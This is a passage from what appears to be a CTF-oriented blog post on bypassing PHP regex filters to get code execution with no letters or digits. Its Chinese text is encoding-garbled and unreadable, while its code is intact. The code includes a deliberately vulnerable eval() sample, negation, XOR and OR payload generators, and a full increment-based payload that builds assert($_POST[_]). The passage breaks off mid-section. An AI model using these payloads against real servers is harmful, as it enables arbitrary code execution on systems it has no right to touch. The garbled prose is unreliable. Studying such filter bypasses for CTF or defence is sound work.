å…¥çš„å‚æ•°é»˜è®¤éƒ½æ˜¯å­—ç¬¦ä¸²å½¢å¼çš„ï¼Œæ­£å¥½ä¹Ÿä¸€å®šä¼šç¬¦åˆè¿™ä¸ªæ¡ä»¶</p><h4 id="æ— å­—æ¯æ•°å­—rce">æ— å­—æ¯æ•°å­—rce</h4><p>ç®€å•æ¥è¯´ï¼Œæ— å­—æ¯æ•°å­—rceå°±æ˜¯æŠŠæˆ‘ä»¬å¯æ§å‚æ•°ä¸­çš„æ•°å­—å’Œå­—æ¯éƒ½banæ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä¸å¯è§å­—ç¬¦çš„è¿ç®—æ„é€ å‡ºå¯è§å­—ç¬¦ï¼Œå¹¶æ‰§è¡Œç›¸åº”å‘½ä»¤ï¼Œä¸‹é¢çš„ç»•è¿‡å§¿åŠ¿æœ¬è´¨éƒ½æ˜¯é€šè¿‡ä¸å¯è§å­—ç¬¦ä¹‹é—´çš„å…³ç³»è¿ç®—æ„é€ å‡ºæˆ‘ä»¬æ‰€éœ€è¦çš„å­—ç¬¦ä¸²å¹¶æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„å‘½ä»¤ã€‚</p><p><strong>ç¤ºä¾‹ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å–åç»•è¿‡">å–åç»•è¿‡</h5><p>é€šè¿‡å–åæ“ä½œä½¿å¾—åŸå‘½ä»¤å˜ä¸ºä¸å¯è§å­—ç¬¦ï¼Œç»•è¿‡wafæ£€æµ‹ï¼Œåœ¨evalæ‰§è¡Œæ—¶å†é€šè¿‡å–åæ“ä½œè¿˜åŸä¸ºåŸæ¶æ„å‘½ä»¤ï¼Œè¿›è¡Œæ‰§è¡Œä»»æ„æ¶æ„ä»£ç </p><p><strong>æ„é€ è„šæœ¬1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;call_user_func&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;(~&quot;</span>.<span class="variable">$a</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;,~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;,&#x27;&#x27;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ„é€ è„šæœ¬2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="å¼‚æˆ–ç»•è¿‡">å¼‚æˆ–ç»•è¿‡</h5><p>é€šè¿‡ä¸å¯è§å­—ç¬¦ä¹‹é—´çš„å¼‚æˆ–è¿ç®—æ„é€ å‡ºä»»æ„æ¶æ„å‘½ä»¤ï¼Œå°†ä¸¤ä¸ªè„šæœ¬æŒ‰ç…§è§„å®šå‘½åæ”¾åˆ°åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ¯æ¬¡ä½¿ç”¨æ—¶éœ€è¦æ ¹æ®é¢˜ç›®ä»£ç æ›´æ¢phpè„šæœ¬ä¸­çš„æ­£åˆ™éƒ¨åˆ†ï¼Œæ›´æ”¹å¥½è¿è¡Œpythonä»£ç ï¼Œæ ¹æ®æç¤ºæ„é€ å³å¯</p><p>xor.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9A-Z]/i&#x27;</span>; <span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p><a href="http://xor.py">xor.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h5 id="æˆ–ç»•è¿‡">æˆ–ç»•è¿‡</h5><p>é€šè¿‡ä¸å¯è§å­—ç¬¦ä¹‹é—´çš„æˆ–è¿ç®—æ„é€ å‡ºä»»æ„æ¶æ„å‘½ä»¤ï¼Œå°†ä¸¤ä¸ªè„šæœ¬æŒ‰ç…§è§„å®šå‘½åæ”¾åˆ°åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ¯æ¬¡ä½¿ç”¨æ—¶éœ€è¦æ ¹æ®é¢˜ç›®ä»£ç æ›´æ¢phpè„šæœ¬ä¸­çš„æ­£åˆ™éƒ¨åˆ†ï¼Œæ›´æ”¹å¥½è¿è¡Œpythonä»£ç ï¼Œæ ¹æ®æç¤ºæ„é€ å³å¯</p><p>or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p><a href="http://or.py">or.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment"># æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><h5 id="è‡ªå¢ç»•è¿‡">è‡ªå¢ç»•è¿‡</h5><p>é€šè¿‡phpçš„è‡ªå¢ç‰¹æ€§ï¼Œæ„é€ å‡ºæ¶æ„å­—ç¬¦ä¸²assert($_POST[_]);ï¼Œè¿›è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œ</p><p>ä½•ä¸ºè‡ªå¢ï¼Ÿ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123195735901.png" alt="image-20240123195735901"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒAåœ¨è¿›è¡Œ++æ“ä½œä¹‹åå˜æˆäº†Bï¼Œè§„å¾‹éµå¾ªasciiç è¡¨ï¼Œè¯¦è§å¼€å¤´ã€‚ä»¥ä¸‹ä¸ºæ„é€ è„šæœ¬</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>æµ‹è¯•å‘ç°<span class="number">7.0</span>.<span class="number">12</span>ä»¥ä¸Šç‰ˆæœ¬ä¸å¯ä½¿ç”¨</span><br><span class="line"><span class="regexp">//</span>ä½¿ç”¨æ—¶éœ€è¦urlç¼–ç ä¸‹</span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;$_&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">å›ºå®šæ ¼å¼ æ„é€ å‡ºæ¥çš„ assert(<span class="variable">$_POST</span>[_]);</span><br><span class="line">ç„¶åpostä¼ å…¥   _=phpinfo();</span><br></pre></td></tr></table></figure><h5 id="ä¸´æ—¶æ–‡ä»¶æ‰§è¡Œ">ä¸´æ—¶æ–‡ä»¶æ‰§è¡Œ</h5><p>æ­¤æ–¹æ³•çš„é€‚ç”¨ç¯å¢ƒç¨æœ‰ä¸åŒï¼Œä»¥ä¸Šæ‰‹æ³•çš†ä¸ºevalç±»çš„æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œï¼Œè€Œæ­¤æ–¹æ³•é€‚ç”¨äºsystemç±»å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 